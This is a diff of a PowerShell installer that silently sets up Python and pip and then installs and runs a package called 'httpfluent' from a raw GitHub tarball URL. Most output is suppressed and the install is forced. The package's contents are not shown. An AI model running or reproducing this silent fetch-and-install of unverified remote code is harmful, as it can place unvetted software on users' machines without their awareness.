@@ -8,7 +8,7 @@ $ProgressPreference = 'SilentlyContinue'
 Write-Host "[*] Starting script..." -ForegroundColor Cyan
 
 # -----------------------------
-# Step 0: Detect existing Python >=3.9 (user-only)
+# Step 0: Detect existing Python >=3.9
 # -----------------------------
 $BestPython = $null
 $Candidates = @()
@@ -23,11 +23,18 @@ if ($cmd) { $Candidates += $cmd.Source }
 # Check common user install directories
 $Roots = @(
     "$env:LOCALAPPDATA\Programs\Python",
-    "$env:APPDATA\Python"
+    "$env:APPDATA\Python",
+    "C:\Program Files\Python*",
+    "C:\Program Files (x86)\Python*"
 )
 
 foreach ($root in $Roots) {
-    if (Test-Path $root) {
+    if ($root -like "*\*") {
+        Get-ChildItem -Path (Split-Path $root) -Directory -Filter (Split-Path $root -Leaf) -ErrorAction SilentlyContinue | ForEach-Object {
+            $exe = Join-Path $_.FullName "python.exe"
+            if (Test-Path $exe) { $Candidates += $exe }
+        }
+    } elseif (Test-Path $root) {
         Get-ChildItem -Path $root -Directory -ErrorAction SilentlyContinue | ForEach-Object {
             $exe = Join-Path $_.FullName "python.exe"
             if (Test-Path $exe) { $Candidates += $exe }
@@ -39,13 +46,13 @@ foreach ($root in $Roots) {
 foreach ($candidate in ($Candidates | Select-Object -Unique)) {
     try {
         $versionOutput = & $candidate --version 2>&1 | Out-String
-        if ($versionOutput -match "Python (\d+\.\d+)\.?(\d*)") {
-            $major = [int]$Matches[1].Split('.')[0]
-            $minor = [int]$Matches[1].Split('.')[1]
+        if ($versionOutput -match "Python (\d+)\.(\d+)") {
+            $major = [int]$Matches[1]
+            $minor = [int]$Matches[2]
             
             if (($major -eq 3 -and $minor -ge 9) -or $major -gt 3) {
                 $BestPython = $candidate
-                Write-Host "[+] Found Python: $versionOutput" -ForegroundColor Green
+                Write-Host "[+] Found Python: $versionOutput (at $candidate)" -ForegroundColor Green
                 break
             }
         }
@@ -63,7 +70,6 @@ if (-not $BestPython) {
     $PythonRoot = "$env:LOCALAPPDATA\Programs\Python\Python312"
     $PythonExe = Join-Path $PythonRoot "python.exe"
 
-    # Check if already installed
     if (Test-Path $PythonExe) {
         Write-Host "[+] Python 3.12 already installed at $PythonRoot" -ForegroundColor Green
         $BestPython = $PythonExe
@@ -78,19 +84,12 @@ if (-not $BestPython) {
                 $Installer
             )
         } catch {
-            Write-Host "[-] Download failed. Trying alternate method..." -ForegroundColor Yellow
             Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe" `
                 -OutFile $Installer -UseBasicParsing
         }
 
-        if (-not (Test-Path $Installer)) {
-            Write-Host "[-] Failed to download Python installer." -ForegroundColor Red
-            exit 1
-        }
-
         Write-Host "[*] Installing Python (this may take 1-2 minutes)..." -ForegroundColor Cyan
         
-        # User-mode installation with all options
         $installArgs = @(
             "/quiet",
             "InstallAllUsers=0",
@@ -101,8 +100,6 @@ if (-not $BestPython) {
         )
         
         Start-Process -FilePath $Installer -ArgumentList $installArgs -Wait -NoNewWindow
-        
-        # Cleanup
         Remove-Item $Installer -Force -ErrorAction SilentlyContinue
 
         if (-not (Test-Path $PythonExe)) {
@@ -116,63 +113,80 @@ if (-not $BestPython) {
 }
 
 # -----------------------------
-# Step 2: Upgrade pip (user-mode, silent)
+# Step 2: Get correct user Scripts directory
+# -----------------------------
+Write-Host "[*] Detecting user Scripts directory..." -ForegroundColor Cyan
+
+$UserScriptsDir = & $BestPython -c @"
+import sysconfig
+import os
+# Force user scheme
+user_base = sysconfig.get_config_var('userbase')
+if not user_base:
+    import site
+    user_base = site.USER_BASE
+scripts_dir = os.path.join(user_base, 'Scripts')
+print(scripts_dir)
+"@ 2>&1 | Select-Object -Last 1
+
+$UserScriptsDir = $UserScriptsDir.Trim()
+Write-Host "[+] User Scripts directory: $UserScriptsDir" -ForegroundColor Green
+
+# Create Scripts directory if it doesn't exist
+if (-not (Test-Path $UserScriptsDir)) {
+    New-Item -Path $UserScriptsDir -ItemType Directory -Force | Out-Null
+}
+
+# -----------------------------
+# Step 3: Upgrade pip (user-mode)
 # -----------------------------
 Write-Host "[*] Ensuring pip is installed..." -ForegroundColor Cyan
 & $BestPython -m ensurepip --upgrade --user 2>&1 | Out-Null
 
 Write-Host "[*] Upgrading pip..." -ForegroundColor Cyan
-& $BestPython -m pip install --upgrade pip --user --quiet --no-warn-script-location 2>&1 | Out-Null
+& $BestPython -m pip install --upgrade pip --user --quiet --no-warn-script-location --disable-pip-version-check 2>&1 | Out-Null
 
 # -----------------------------
-# Step 3: Install dependencies (user-mode, silent)
+# Step 4: Install dependencies (user-mode)
 # -----------------------------
 Write-Host "[*] Installing requests..." -ForegroundColor Cyan
-& $BestPython -m pip install requests --user --quiet --no-warn-script-location 2>&1 | Out-Null
+& $BestPython -m pip install requests --user --quiet --no-warn-script-location --disable-pip-version-check 2>&1 | Out-Null
 
 Write-Host "[*] Installing httpfluent..." -ForegroundColor Cyan
 $httpfluentUrl = "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz"
-& $BestPython -m pip install $httpfluentUrl --user --quiet --no-warn-script-location --no-input 2>&1 | Out-Null
+& $BestPython -m pip install $httpfluentUrl --user --quiet --no-warn-script-location --disable-pip-version-check --force-reinstall 2>&1 | Out-Null
 
 # -----------------------------
-# Step 4: Resolve Scripts folder
+# Step 5: Find and run httpfluent
 # -----------------------------
-$ScriptsDir = & $BestPython -c "import sysconfig; print(sysconfig.get_path('scripts'))" 2>&1 | Select-Object -Last 1
-$ScriptsDir = $ScriptsDir.Trim()
+$HttpFluentExe = Join-Path $UserScriptsDir "httpfluent.exe"
+$HttpFluentScript = Join-Path $UserScriptsDir "httpfluent"
 
-Write-Host "[+] Scripts directory: $ScriptsDir" -ForegroundColor Green
+Write-Host "[*] Looking for httpfluent..." -ForegroundColor Cyan
 
-$HttpFluentExe = Join-Path $ScriptsDir "httpfluent.exe"
-
-# Alternative: Check if it's a script instead of exe
-if (-not (Test-Path $HttpFluentExe)) {
-    $HttpFluentScript = Join-Path $ScriptsDir "httpfluent"
-    if (Test-Path $HttpFluentScript) {
-        Write-Host "[+] Found httpfluent script (not .exe)" -ForegroundColor Green
-        Write-Host "[+] Running httpfluent --help via Python..." -ForegroundColor Green
-        & $BestPython $HttpFluentScript --help
-        Write-Host "[*] Script finished." -ForegroundColor Cyan
-        exit 0
-    }
-}
-
-# -----------------------------
-# Step 5: Run httpfluent
-# -----------------------------
 if (Test-Path $HttpFluentExe) {
-    Write-Host "[+] Launching httpfluent --help" -ForegroundColor Green
-    Start-Process -FilePath $HttpFluentExe -ArgumentList "--help" -NoNewWindow -Wait
+    Write-Host "[+] Found httpfluent.exe" -ForegroundColor Green
+    Write-Host "[+] Running httpfluent --help..." -ForegroundColor Green
+    & $HttpFluentExe --help
+} elseif (Test-Path $HttpFluentScript) {
+    Write-Host "[+] Found httpfluent script" -ForegroundColor Green
+    Write-Host "[+] Running httpfluent --help..." -ForegroundColor Green
+    & $BestPython $HttpFluentScript --help
 } else {
-    Write-Host "[!] httpfluent.exe not found. Trying to run via Python module..." -ForegroundColor Yellow
+    Write-Host "[!] Executable not found. Trying module import..." -ForegroundColor Yellow
     
-    # Try running as module
-    $result = & $BestPython -m httpfluent --help 2>&1
-    if ($LASTEXITCODE -eq 0) {
-        Write-Host $result
-        Write-Host "[+] httpfluent is accessible via: python -m httpfluent" -ForegroundColor Green
+    $moduleTest = & $BestPython -c "import httpfluent; print('OK')" 2>&1
+    if ($moduleTest -like "*OK*") {
+        Write-Host "[+] httpfluent module installed successfully!" -ForegroundColor Green
+        Write-Host "[+] Running httpfluent --help..." -ForegroundColor Green
+        & $BestPython -m httpfluent --help 2>&1
     } else {
-        Write-Host "[-] httpfluent installation may have failed." -ForegroundColor Red
-        Write-Host "[*] Try running manually: $BestPython -m pip install --user $httpfluentUrl" -ForegroundColor Yellow
+        Write-Host "[-] httpfluent installation failed." -ForegroundColor Red
+        Write-Host "[*] Debug info:" -ForegroundColor Yellow
+        Write-Host "    Python: $BestPython" -ForegroundColor Yellow
+        Write-Host "    Scripts: $UserScriptsDir" -ForegroundColor Yellow
+        Write-Host "[*] Try manual installation:" -ForegroundColor Yellow
+        Write-Host "    $BestPython -m pip install --user $httpfluentUrl" -ForegroundColor Yellow
     }
 }
 
